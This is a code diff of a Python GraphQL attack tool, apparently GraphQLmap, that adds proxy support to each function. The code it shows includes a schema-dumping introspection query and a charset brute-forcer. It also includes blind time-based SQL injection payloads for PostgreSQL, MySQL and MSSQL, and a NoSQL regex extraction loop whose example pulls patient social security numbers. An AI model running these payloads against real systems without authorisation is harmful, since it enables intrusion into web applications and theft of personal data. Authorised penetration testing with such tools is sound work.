@@ -1,17 +1,17 @@
 #!/usr/bin/python
 from utils import *
+import re
 
-
-def display_types(URL, method, headers, use_json):
+def display_types(URL, method, headers, use_json, proxy):
     payload = "{__schema{types{name}}}"
-    r = requester(URL, method, payload, headers, use_json)
+    r = requester(URL, method, payload, headers, use_json, proxy)
     if r is not None:
         schema = r.json()
         for names in schema['data']['__schema']['types']:
             print(names)
 
 
-def dump_schema(url, method, graphversion, headers, use_json):
+def dump_schema(url, method, graphversion, headers, use_json, proxy):
     """
         Dump the GraphQL schema via Instrospection
 
@@ -27,7 +27,7 @@ def dump_schema(url, method, graphversion, headers, use_json):
     else:
         payload = "fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated:+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated:+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}"
 
-    r = requester(url, method, payload, headers, use_json)
+    r = requester(url, method, payload, headers, use_json, proxy)
     schema = r.json()
 
     print("============= [SCHEMA] ===============")
@@ -70,10 +70,10 @@ def dump_schema(url, method, graphversion, headers, use_json):
                     print("")
 
 
-def exec_graphql(url, method, query, headers=None, use_json=False, only_length=0):
+def exec_graphql(url, method, query, proxy, headers=None, use_json=False, only_length=0):
     if headers is None:
         headers = {}
-    r = requester(url, method, query, headers, use_json)
+    r = requester(url, method, query, headers, use_json, proxy)
     try:
         graphql = r.json()
         errors = graphql.get("errors")
@@ -102,15 +102,13 @@ def exec_graphql(url, method, query, headers=None, use_json=False, only_length=0
         return "\033[91m[!]\033[0m {}".format(str(e))
 
 
-def exec_advanced(url, method, query, headers, use_json):
-    print(query)
-
+def exec_advanced(url, method, query, headers, use_json, proxy):
     # Allow a user to bruteforce character from a charset
     # e.g: {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}
     if "GRAPHQL_CHARSET" in query:
         graphql_charset = "!$%\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"
         for c in graphql_charset:
-            length = exec_graphql(url, method, query.replace("GRAPHQL_CHARSET", c), headers, use_json, only_length=1)
+            length = exec_graphql(url, method, query.replace("GRAPHQL_CHARSET", c), proxy, headers, use_json, only_length=1)
             print(
                 "[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace("GRAPHQL_CHARSET", c)))
 
@@ -120,45 +118,44 @@ def exec_advanced(url, method, query, headers, use_json):
     elif "GRAPHQL_INCREMENT_" in query:
         regex = re.compile("GRAPHQL_INCREMENT_(\d*)")
         match = regex.findall(query)
-
         for i in range(int(match[0])):
             pattern = "GRAPHQL_INCREMENT_" + match[0]
-            length = exec_graphql(url, method, query.replace(pattern, str(i)), headers, use_json, only_length=1)
+            length = exec_graphql(url, method, query.replace(pattern, str(i)), proxy, headers, use_json, only_length=1)
             print("[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace(pattern, str(i))))
 
     # Otherwise execute the query and display the JSON result
     else:
-        print(exec_graphql(url, method, query, headers, use_json))
+        print(exec_graphql(url, method, query, proxy, headers, use_json))
 
 
-def blind_postgresql(url, method, headers, use_json):
+def blind_postgresql(url, method, proxy, headers, use_json):
     query = input("Query > ")
     payload = "1 AND pg_sleep(30) --"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
     injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    requester(url, method, injected, headers, use_json)
+    requester(url, method, injected, headers, use_json, proxy)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
 
-def blind_mysql(url, method, headers, use_json):
+def blind_mysql(url, method, proxy, headers, use_json):
     query = input("Query > ")
     payload = "'-SLEEP(30); #"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
     injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    requester(url, method, injected, headers, use_json)
+    requester(url, method, injected, headers, use_json, proxy)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
 
-def blind_mssql(url, method, headers, use_json):
+def blind_mssql(url, method, proxy, headers, use_json):
     query = input("Query > ")
     payload = "'; WAITFOR DELAY '00:00:30';"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
     injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    requester(url, method, injected, headers, use_json)
+    requester(url, method, injected, headers, use_json, proxy)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
 
-def blind_nosql(url, method, headers, use_json):
+def blind_nosql(url, method, proxy, headers, use_json):
     # Query - include BLIND_PLACEHOLDER. e.g. {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
     query = input("Query > ")
     # Check the input (known value) against the data found - e.g. 5d089c51dcab2d0032fdd08d
@@ -174,7 +171,7 @@ def blind_nosql(url, method, headers, use_json):
         old_data = data
         for c in charset:
             injected = query.replace("BLIND_PLACEHOLDER", data + c)
-            r = requester(url, method, injected, headers, use_json)
+            r = requester(url, method, injected, headers, use_json, proxy)
             if check in r.text:
                 data += c
                 # display data and update the current line
